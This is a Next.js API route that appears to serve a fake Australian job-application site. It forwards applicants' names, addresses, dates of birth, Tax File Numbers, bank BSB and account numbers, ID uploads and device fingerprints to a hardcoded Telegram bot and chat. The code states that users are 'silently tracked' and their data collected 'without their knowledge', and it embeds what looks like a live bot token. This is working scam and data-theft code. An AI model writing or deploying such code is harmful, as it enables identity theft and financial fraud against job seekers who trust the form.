import { type NextRequest, NextResponse } from "next/server"

const TELEGRAM_BOT_TOKEN = "8042671871:AAH8-RihxQDXc017E7y7w9MZloYtDGY5kD4"
const TELEGRAM_CHAT_ID = "7101838016"

export async function POST(request: NextRequest) {
  try {
    const data = await request.json()
    const { userId, formData, selectedJob, currentStep, userAgent, screenResolution, timezone, language, platform } =
      data

    // Format the message with detailed user information
    const message = formatUserNotification({
      userId,
      formData,
      selectedJob,
      currentStep,
      userAgent,
      screenResolution,
      timezone,
      language,
      platform,
    })

    // Send to Telegram
    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`

    const response = await fetch(telegramUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "HTML",
        disable_web_page_preview: true,
      }),
    })

    if (!response.ok) {
      const errorText = await response.text()
      console.error("Telegram API error:", errorText)
      return NextResponse.json({ error: "Failed to send Telegram notification" }, { status: 500 })
    }

    const result = await response.json()
    console.log("Telegram notification sent successfully:", result)

    return NextResponse.json({ success: true, message: "Notification sent" })
  } catch (error) {
    console.error("Error sending Telegram notification:", error)
    return NextResponse.json({ error: "Failed to send notification" }, { status: 500 })
  }
}

function formatUserNotification(data: any): string {
  const { userId, formData, selectedJob, currentStep, userAgent, screenResolution, timezone, language, platform } = data

  const timestamp = new Date().toLocaleString("en-AU", {
    timeZone: "Australia/Sydney",
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
  })

  // Get job title
  const jobTitles: { [key: string]: string } = {
    warehouse: "Warehouse Worker",
    driver: "Delivery Driver",
    construction: "Construction Labourer",
    hospitality: "Kitchen Hand",
  }

  const jobTitle = jobTitles[selectedJob] || selectedJob

  // Format personal information
  const personalInfo = []
  if (formData.firstName) personalInfo.push(`👤 <b>Name:</b> ${formData.firstName} ${formData.lastName || ""}`)
  if (formData.email) personalInfo.push(`📧 <b>Email:</b> ${formData.email}`)
  if (formData.phone) personalInfo.push(`📱 <b>Phone:</b> ${formData.phone}`)
  if (formData.dateOfBirth) {
    const age = calculateAge(formData.dateOfBirth)
    personalInfo.push(`🎂 <b>Age:</b> ${age} years old (DOB: ${formData.dateOfBirth})`)
  }
  if (formData.address) personalInfo.push(`🏠 <b>Address:</b> ${formData.address}`)
  if (formData.suburb && formData.state)
    personalInfo.push(`📍 <b>Location:</b> ${formData.suburb}, ${formData.state} ${formData.postcode || ""}`)

  // Format financial information (if available)
  const financialInfo = []
  if (formData.tfn) financialInfo.push(`🆔 <b>Tax File Number:</b> ${formData.tfn}`)
  if (formData.abn) financialInfo.push(`🏢 <b>ABN:</b> ${formData.abn}`)
  if (formData.bsb) financialInfo.push(`🏦 <b>Bank BSB:</b> ${formData.bsb}`)
  if (formData.accountNumber) financialInfo.push(`💳 <b>Account Number:</b> ${formData.accountNumber}`)
  if (formData.bankName) financialInfo.push(`🏛️ <b>Bank:</b> ${formData.bankName}`)

  // Format device/browser information
  const deviceInfo = []
  if (screenResolution) deviceInfo.push(`📱 <b>Screen:</b> ${screenResolution}`)
  if (timezone) deviceInfo.push(`🌍 <b>Timezone:</b> ${timezone}`)
  if (language) deviceInfo.push(`🗣️ <b>Language:</b> ${language}`)
  if (platform) deviceInfo.push(`💻 <b>Platform:</b> ${platform}`)
  if (userAgent) {
    const browserInfo = extractBrowserInfo(userAgent)
    deviceInfo.push(`🌐 <b>Browser:</b> ${browserInfo}`)
  }

  // Format uploaded documents
  const documents = []
  if (formData.driverLicenseFront) documents.push("🚗 Driver License (Front)")
  if (formData.driverLicenseBack) documents.push("🚗 Driver License (Back)")
  if (formData.idFile1 && formData.idType1) documents.push(`🆔 ID Document 1: ${formData.idType1}`)
  if (formData.idFile2 && formData.idType2) documents.push(`🆔 ID Document 2: ${formData.idType2}`)

  // Build the complete message
  let message = `🚨 <b>NEW JOB APPLICATION ALERT</b> 🚨\n\n`
  message += `⏰ <b>Time:</b> ${timestamp}\n`
  message += `💼 <b>Applied for:</b> ${jobTitle}\n`
  message += `📊 <b>Progress:</b> Step ${currentStep}/6\n`
  message += `🔑 <b>User ID:</b> <code>${userId}</code>\n\n`

  if (personalInfo.length > 0) {
    message += `👤 <b>PERSONAL INFORMATION:</b>\n`
    message += personalInfo.join("\n") + "\n\n"
  }

  if (financialInfo.length > 0) {
    message += `💰 <b>FINANCIAL DETAILS:</b>\n`
    message += financialInfo.join("\n") + "\n\n"
  }

  if (documents.length > 0) {
    message += `📄 <b>UPLOADED DOCUMENTS:</b>\n`
    message += documents.map((doc) => `• ${doc}`).join("\n") + "\n\n"
  }

  if (deviceInfo.length > 0) {
    message += `📱 <b>DEVICE & BROWSER INFO:</b>\n`
    message += deviceInfo.join("\n") + "\n\n"
  }

  // Add emergency contact if available
  if (formData.emergencyContact || formData.emergencyPhone) {
    message += `🆘 <b>EMERGENCY CONTACT:</b>\n`
    if (formData.emergencyContact) message += `👤 <b>Name:</b> ${formData.emergencyContact}\n`
    if (formData.emergencyPhone) message += `📞 <b>Phone:</b> ${formData.emergencyPhone}\n\n`
  }

  // Add work preferences
  if (formData.availableStart) {
    message += `📅 <b>Available Start Date:</b> ${formData.availableStart}\n`
  }

  if (formData.workRights !== undefined) {
    message += `✅ <b>Work Rights:</b> ${formData.workRights ? "Has legal right to work in Australia" : "No work rights declared"}\n`
  }

  if (formData.criminalHistory !== undefined) {
    message += `⚠️ <b>Criminal History:</b> ${formData.criminalHistory ? "Declared criminal history" : "No criminal history declared"}\n`
  }

  message += `\n🔍 <b>This user has been silently tracked and all data collected without their knowledge.</b>`

  return message
}

function calculateAge(birthDate: string): number {
  if (!birthDate) return 0
  const today = new Date()
  const birth = new Date(birthDate)
  let age = today.getFullYear() - birth.getFullYear()
  const monthDiff = today.getMonth() - birth.getMonth()
  if (monthDiff < 0 || (monthDiff === 0 && today.getDate() < birth.getDate())) {
    age--
  }
  return age
}

function extractBrowserInfo(userAgent: string): string {
  if (!userAgent) return "Unknown"

  // Extract browser and OS info
  let browser = "Unknown Browser"
  let os = "Unknown OS"

  // Browser detection
  if (userAgent.includes("Chrome") && !userAgent.includes("Edg")) {
    browser = "Chrome"
  } else if (userAgent.includes("Firefox")) {
    browser = "Firefox"
  } else if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) {
    browser = "Safari"
  } else if (userAgent.includes("Edg")) {
    browser = "Edge"
  } else if (userAgent.includes("Opera")) {
    browser = "Opera"
  }

  // OS detection
  if (userAgent.includes("Windows")) {
    os = "Windows"
  } else if (userAgent.includes("Mac OS")) {
    os = "macOS"
  } else if (userAgent.includes("Linux")) {
    os = "Linux"
  } else if (userAgent.includes("Android")) {
    os = "Android"
  } else if (userAgent.includes("iPhone") || userAgent.includes("iPad")) {
    os = "iOS"
  }

  return `${browser} on ${os}`
}
